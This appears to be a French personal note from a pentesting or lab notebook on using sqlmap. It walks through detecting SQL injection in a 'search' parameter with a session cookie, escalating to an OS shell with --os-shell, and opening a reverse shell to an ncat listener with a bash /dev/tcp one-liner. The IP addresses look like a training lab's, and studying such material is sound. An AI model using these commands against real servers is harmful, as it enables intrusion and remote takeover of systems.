<sub>[Procédure serveur](server_procedure.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Cryptage](cryptage.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Outils](tools.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Sites utiles](useful_website.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Lexique](lexique.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Index](index.md)</sub>
<sub>[Retour](index.md)</sub>
#sqlmap

SQLMAP => detect et exploit sql injection flaws (défauts)
  ex sqlmap -u *URL*?*PARAM*=any+query' --cookie="*COOKIE*" =>
      sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' --cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1
  Si ça ramène => GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
  c'est bon signe
  du coup relancer sqlmap en ajoutant --os-sql
  ex : sqlmap -u 'http://10.129.49.29/dashboard.php?search=any+query' --cookie="PHPSESSID=mf6oqmf27iko13aj0o5n2a11hv" --os-shell
  PAR CONTRE CE N EST PAS stable (time out)
  pour avoir une console stable => écouter le port 443 avec ncat puis envoyer en commande dans sqlmap =>
  bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1" et PAF on a l accès sur ncat
